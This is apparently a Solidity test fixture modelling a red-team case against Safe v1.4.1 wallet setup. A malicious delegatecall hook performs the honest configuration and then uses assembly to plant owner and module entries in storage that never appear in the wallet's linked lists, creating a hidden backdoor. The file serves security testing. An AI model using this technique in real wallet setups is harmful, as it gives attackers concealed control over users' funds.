// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

// TEST FIXTURE ONLY. Not part of the system under test and not audited. Used by T9.
//
// Models red-team row 2.1: a MALICIOUS target for the delegatecall that Safe.setup() makes to its `to`/`data`
// hook. It first does exactly what the honest SetupFixture.configure does (enable the recovery module, add the
// guardians), so a read-back of the configuration looks honest. Then it writes owners[evilOwner] and/or
// modules[evilModule] directly in the Safe's storage WITHOUT linking them into Safe's sentinel-based lists.
//
// Safe v1.4.1 storage layout (inheritance order of Safe.sol): slot 0 = Singleton.singleton,
// slot 1 = ModuleManager.modules (mapping(address => address)), slot 2 = OwnerManager.owners
// (mapping(address => address)), slot 3 = ownerCount, slot 4 = threshold. The test checks this layout by
// reading the slots of honest entries before relying on it.

interface ISafeSelfH {
    function enableModule(address module) external;
}

interface IRecoveryModuleAdminH {
    function addGuardianWithThreshold(address guardian, uint256 threshold) external;
}

contract HiddenEntrySetup {
    uint256 private constant MODULES_SLOT = 1;
    uint256 private constant OWNERS_SLOT = 2;
    // Value written into the planted mapping entries. Any non-zero value passes Safe's checks; 0x1 (the
    // sentinel) is what the real last element of each list holds, so the planted slot looks like a list tail.
    uint256 private constant PLANTED_VALUE = 1;

    function configureAndPlant(
        address recoveryModule,
        address[] calldata guardians,
        uint256 guardianThreshold,
        address evilOwner,
        address evilModule
    ) external {
        // Honest part (same as SetupFixture.configure with modules = [recoveryModule]).
        ISafeSelfH(address(this)).enableModule(recoveryModule);
        for (uint256 i = 0; i < guardians.length; i++) {
            uint256 t = i + 1 == guardians.length ? guardianThreshold : 1;
            IRecoveryModuleAdminH(recoveryModule).addGuardianWithThreshold(guardians[i], t);
        }
        // Malicious part: unlinked mapping entries.
        if (evilOwner != address(0)) _plant(OWNERS_SLOT, evilOwner);
        if (evilModule != address(0)) _plant(MODULES_SLOT, evilModule);
    }

    function _plant(uint256 mappingSlot, address key) private {
        // slot of mapping[key] = keccak256(abi.encode(key, mappingSlot))
        assembly {
            mstore(0x00, key)
            mstore(0x20, mappingSlot)
            sstore(keccak256(0x00, 0x40), PLANTED_VALUE)
        }
    }
}
